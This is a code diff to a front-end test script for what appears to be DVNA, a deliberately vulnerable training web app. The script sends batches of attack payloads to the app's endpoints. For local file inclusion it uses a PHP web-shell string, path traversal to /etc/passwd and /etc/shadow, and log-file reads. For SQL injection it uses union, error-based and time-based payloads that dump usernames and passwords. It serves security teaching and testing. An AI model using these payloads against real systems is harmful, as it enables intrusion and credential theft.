@@ -20,12 +20,18 @@ var addToResults = function(data, test) {
     original_request = htmlEscape(response.original_request)
   }
 
+  // $(test).append(
+  //   `<div class="${className} lead">
+  //       <p>Request: ${original_request}</p>
+  //       <p>Response: ${response_data}</p>
+  //     </div>`
+  // )
   $(test).append(
     `<div class="${className} lead">
         <p>Request: ${original_request}</p>
-        <p>Response: ${response_data}</p>
       </div>`
   )
+
 }
 
 var sendRequest = function(val, url, id) {
@@ -46,69 +52,102 @@ var sendRequest = function(val, url, id) {
   })
 }
 
+$('#runLFITest').on('click', function() {
+  var self = this;
+  $(this).addClass('disabled');
+  $('#automated_results_lfi').html('');
+  $.when(
+    sendRequest("<?php passthru($_GET['cmd']); ?>", "/app/lfi", "#automated_results_lfi"),
+    sendRequest("php://filter/convert.base64-encode/resource=", "/app/lfi", "#automated_results_lfi"),
+    sendRequest("template1", "/app/lfi", "#automated_results_lfi"),
+    sendRequest("%00", "/app/lfi", "#automated_results_lfi"),
+    sendRequest("../../../../../etc/issue", "/app/lfi", "#automated_results_lfi"),
+    sendRequest("template2&color=black", "/app/lfi", "#automated_results_lfi"),
+    sendRequest("../../../../../etc/mot", "/app/lfi", "#automated_results_lfi"),
+    sendRequest("../../../../../etc/passwd", "/app/lfi", "#automated_results_lfi"),
+    sendRequest("../../../../../etc/group", "/app/lfi", "#automated_results_lfi"),
+    sendRequest("../../../../../etc/resolv.con", "/app/lfi", "#automated_results_lfi"),
+    sendRequest("../../../../../etc/shado", "/app/lfi", "#automated_results_lfi"),
+    sendRequest("/etc/httpd/logs/acces_log", "/app/lfi", "#automated_results_lfi"),
+    sendRequest("/etc/httpd/logs/error_log", "/app/lfi", "#automated_results_lfi"),
+    sendRequest("/var/www/logs/access_log", "/app/lfi", "#automated_results_lfi"),
+    sendRequest("/var/www/logs/access.log", "/app/lfi", "#automated_results_lfi"),
+    sendRequest("/usr/local/apache/logs/access_ log", "/app/lfi", "#automated_results_lfi"),
+    sendRequest("/usr/local/apache/logs/access. log", "/app/lfi", "#automated_results_lfi"),
+    sendRequest("/var/log/apache/access_log", "/app/lfi", "#automated_results_lfi"),
+    sendRequest("/var/log/apache2/access_log", "/app/lfi", "#automated_results_lfi"),
+    sendRequest("/var/log/apache/access.log", "/app/lfi", "#automated_results_lfi"),
+    sendRequest("/var/log/apache2/access.log", "/app/lfi", "#automated_results_lfi"),
+    sendRequest("/var/log/access_log", "/app/lfi", "#automated_results_lfi")
+  ).then(function() {
+    $(self).removeClass('disabled');
+  });
+
+})
+
 $('#runSQLTest').on('click', function() {
   var self = this;
   $(this).addClass('disabled');
   $('#automated_results_sql').html('');
   $.when(
-    sendRequest("-'", "/app/usersearch", "#automated_results_sql"),
-    sendRequest("' ''", "/app/usersearch", "#automated_results_sql"),
-    sendRequest("' &'", "/app/usersearch", "#automated_results_sql"),
-    sendRequest("' ^'", "/app/usersearch", "#automated_results_sql"),
-    sendRequest("'*'", "/app/usersearch", "#automated_results_sql"),
-    sendRequest("' or ''-'", "/app/usersearch", "#automated_results_sql"),
-    sendRequest("' or '' '", "/app/usersearch", "#automated_results_sql"),
-    sendRequest("' or ''&'", "/app/usersearch", "#automated_results_sql"),
-    sendRequest("' or ''^'", "/app/usersearch", "#automated_results_sql"),
-    sendRequest("' or ''*'", "/app/usersearch", "#automated_results_sql"),
-    sendRequest("\"-\"", "/app/usersearch", "#automated_results_sql"),
-    sendRequest("\" \"", "/app/usersearch", "#automated_results_sql"),
-    sendRequest("\"&\"", "/app/usersearch", "#automated_results_sql"),
-    sendRequest("\"^\"", "/app/usersearch", "#automated_results_sql"),
-    sendRequest("\"*\"", "/app/usersearch", "#automated_results_sql"),
-    sendRequest("\" or \"\"-\"", "/app/usersearch", "#automated_results_sql"),
-    sendRequest("\" or \"\" \"", "/app/usersearch", "#automated_results_sql"),
-    sendRequest("\" or \"\"&\"", "/app/usersearch", "#automated_results_sql"),
-    sendRequest("\" or \"\"^\"", "/app/usersearch", "#automated_results_sql"),
-    sendRequest("\" or \"\"*\"", "/app/usersearch", "#automated_results_sql"),
-    sendRequest("or true--", "/app/usersearch", "#automated_results_sql"),
-    sendRequest("\" or true--", "/app/usersearch", "#automated_results_sql"),
-    sendRequest("' or true--", "/app/usersearch", "#automated_results_sql"),
-    sendRequest("\") or true--", "/app/usersearch", "#automated_results_sql"),
-    sendRequest("test", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' UNION ALL SELECT NULL,version() #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("someone@test.com", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("This is some test \"DATA 'testind'\"", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='dvna' #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' UNION ALL SELECT NULL,concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME='users' #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' UNION ALL SELECT NULL,concat(0x28,login,0x3a,password,0x29) FROM users #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' UNION ALL SELECT NULL,concat(0x28,login,0x3a,password,0x29) FROM dvna.users #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT 0,1))) #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema=\"dvna\" LIMIT 0,1))) #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("%27 Some test data", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_NAME=\"users\" LIMIT 0,1))) #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' AND extractvalue(rand(),concat(0x3a,(SELECT concat(login,0x3a,password) FROM users LIMIT 0,1))) #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' AND extractvalue(rand(),concat(0x3a,(SELECT concat(login,0x3a,password) FROM dvna.users LIMIT 0,1))) #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' AND (SELECT 1 FROM(SELECT COUNT(*),concat(version(),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a) #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME=\"table1\" LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.COLUMNS GROUP BY a LIMIT 0,1)b) #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' AND (SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT name FROM users LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a) #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' AND (SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT name FROM dvna.users LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a) #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' AND (ascii(substr((SELECT version()),1,1))) > 52 #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' AND (SELECT version()) LIKE \"5 %\" #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' AND (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))) > 95 #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' AND (ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema=\"dvna\" LIMIT 0,1),1,1))) > 95 #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' AND (ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME=\"users\" LIMIT 0,1),1,1))) > 95 #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' AND (ascii(substr((SELECT name FROM users LIMIT 0,1),1,1))) > 95 #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' AND (ascii(substr((SELECT name FROM dvna.users LIMIT 0,1),1,1))) > 95 #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' AND sleep(10) #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' AND IF((SELECT ascii(substr(version(),1,1))) > 53,sleep(10),NULL) #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' AND IF((SELECT version()) LIKE \"5 %\",sleep(10),NULL) #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' AND IF(((ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)))) > 95,sleep(10),NULL) #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' AND IF(((ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema=\"dvna\" LIMIT 0,1),1,1))))> 95,sleep(10),NULL) #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' AND IF(((ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME=\"users\" LIMIT 0,1),1,1)))) > 95,sleep(10),NULL) #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' AND IF(((ascii(substr((SELECT name FROM users LIMIT 0,1),1,1)))) > 95,sleep(10),NULL) #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("' AND IF(((ascii(substr((SELECT name FROM dvna.users LIMIT 0,1),1,1)))) >95,sleep(10),NULL) #", "/app/usersearch", '#automated_results_sql'),
-    sendRequest("'", "/app/usersearch", '#automated_results_sql')
+    sendRequest("-'", "/app/sql", "#automated_results_sql"),
+    sendRequest("' ''", "/app/sql", "#automated_results_sql"),
+    sendRequest("' &'", "/app/sql", "#automated_results_sql"),
+    sendRequest("' ^'", "/app/sql", "#automated_results_sql"),
+    sendRequest("'*'", "/app/sql", "#automated_results_sql"),
+    sendRequest("' or ''-'", "/app/sql", "#automated_results_sql"),
+    sendRequest("' or '' '", "/app/sql", "#automated_results_sql"),
+    sendRequest("' or ''&'", "/app/sql", "#automated_results_sql"),
+    sendRequest("' or ''^'", "/app/sql", "#automated_results_sql"),
+    sendRequest("' or ''*'", "/app/sql", "#automated_results_sql"),
+    sendRequest("\"-\"", "/app/sql", "#automated_results_sql"),
+    sendRequest("\" \"", "/app/sql", "#automated_results_sql"),
+    sendRequest("\"&\"", "/app/sql", "#automated_results_sql"),
+    sendRequest("\"^\"", "/app/sql", "#automated_results_sql"),
+    sendRequest("\"*\"", "/app/sql", "#automated_results_sql"),
+    sendRequest("\" or \"\"-\"", "/app/sql", "#automated_results_sql"),
+    sendRequest("\" or \"\" \"", "/app/sql", "#automated_results_sql"),
+    sendRequest("\" or \"\"&\"", "/app/sql", "#automated_results_sql"),
+    sendRequest("\" or \"\"^\"", "/app/sql", "#automated_results_sql"),
+    sendRequest("\" or \"\"*\"", "/app/sql", "#automated_results_sql"),
+    sendRequest("or true--", "/app/sql", "#automated_results_sql"),
+    sendRequest("\" or true--", "/app/sql", "#automated_results_sql"),
+    sendRequest("' or true--", "/app/sql", "#automated_results_sql"),
+    sendRequest("\") or true--", "/app/sql", "#automated_results_sql"),
+    sendRequest("test", "/app/sql", '#automated_results_sql'),
+    sendRequest("' UNION ALL SELECT NULL,version() #", "/app/sql", '#automated_results_sql'),
+    sendRequest("someone@test.com", "/app/sql", '#automated_results_sql'),
+    sendRequest("This is some test \"DATA 'testind'\"", "/app/sql", '#automated_results_sql'),
+    sendRequest("' UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='dvna' #", "/app/sql", '#automated_results_sql'),
+    sendRequest("' UNION ALL SELECT NULL,concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME='users' #", "/app/sql", '#automated_results_sql'),
+    sendRequest("' UNION ALL SELECT NULL,concat(0x28,login,0x3a,password,0x29) FROM users #", "/app/sql", '#automated_results_sql'),
+    sendRequest("' UNION ALL SELECT NULL,concat(0x28,login,0x3a,password,0x29) FROM dvna.users #", "/app/sql", '#automated_results_sql'),
+    sendRequest("' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT 0,1))) #", "/app/sql", '#automated_results_sql'),
+    sendRequest("' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema=\"dvna\" LIMIT 0,1))) #", "/app/sql", '#automated_results_sql'),
+    sendRequest("%27 Some test data", "/app/sql", '#automated_results_sql'),
+    sendRequest("' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_NAME=\"users\" LIMIT 0,1))) #", "/app/sql", '#automated_results_sql'),
+    sendRequest("' AND extractvalue(rand(),concat(0x3a,(SELECT concat(login,0x3a,password) FROM users LIMIT 0,1))) #", "/app/sql", '#automated_results_sql'),
+    sendRequest("' AND extractvalue(rand(),concat(0x3a,(SELECT concat(login,0x3a,password) FROM dvna.users LIMIT 0,1))) #", "/app/sql", '#automated_results_sql'),
+    sendRequest("' AND (SELECT 1 FROM(SELECT COUNT(*),concat(version(),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a) #", "/app/sql", '#automated_results_sql'),
+    sendRequest("' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME=\"table1\" LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.COLUMNS GROUP BY a LIMIT 0,1)b) #", "/app/sql", '#automated_results_sql'),
+    sendRequest("' AND (SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT name FROM users LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a) #", "/app/sql", '#automated_results_sql'),
+    sendRequest("' AND (SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT name FROM dvna.users LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a) #", "/app/sql", '#automated_results_sql'),
+    sendRequest("' AND (ascii(substr((SELECT version()),1,1))) > 52 #", "/app/sql", '#automated_results_sql'),
+    sendRequest("' AND (SELECT version()) LIKE \"5 %\" #", "/app/sql", '#automated_results_sql'),
+    sendRequest("' AND (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))) > 95 #", "/app/sql", '#automated_results_sql'),
+    sendRequest("' AND (ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema=\"dvna\" LIMIT 0,1),1,1))) > 95 #", "/app/sql", '#automated_results_sql'),
+    sendRequest("' AND (ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME=\"users\" LIMIT 0,1),1,1))) > 95 #", "/app/sql", '#automated_results_sql'),
+    sendRequest("' AND (ascii(substr((SELECT name FROM users LIMIT 0,1),1,1))) > 95 #", "/app/sql", '#automated_results_sql'),
+    sendRequest("' AND (ascii(substr((SELECT name FROM dvna.users LIMIT 0,1),1,1))) > 95 #", "/app/sql", '#automated_results_sql'),
+    sendRequest("' AND sleep(10) #", "/app/sql", '#automated_results_sql'),
+    sendRequest("' AND IF((SELECT ascii(substr(version(),1,1))) > 53,sleep(10),NULL) #", "/app/sql", '#automated_results_sql'),
+    sendRequest("' AND IF((SELECT version()) LIKE \"5 %\",sleep(10),NULL) #", "/app/sql", '#automated_results_sql'),
+    sendRequest("' AND IF(((ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)))) > 95,sleep(10),NULL) #", "/app/sql", '#automated_results_sql'),
+    sendRequest("' AND IF(((ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema=\"dvna\" LIMIT 0,1),1,1))))> 95,sleep(10),NULL) #", "/app/sql", '#automated_results_sql'),
+    sendRequest("' AND IF(((ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME=\"users\" LIMIT 0,1),1,1)))) > 95,sleep(10),NULL) #", "/app/sql", '#automated_results_sql'),
+    sendRequest("' AND IF(((ascii(substr((SELECT name FROM users LIMIT 0,1),1,1)))) > 95,sleep(10),NULL) #", "/app/sql", '#automated_results_sql'),
+    sendRequest("' AND IF(((ascii(substr((SELECT name FROM dvna.users LIMIT 0,1),1,1)))) >95,sleep(10),NULL) #", "/app/sql", '#automated_results_sql'),
+    sendRequest("'", "/app/sql", '#automated_results_sql')
   ).then(function() {
     $(self).removeClass('disabled');
   });
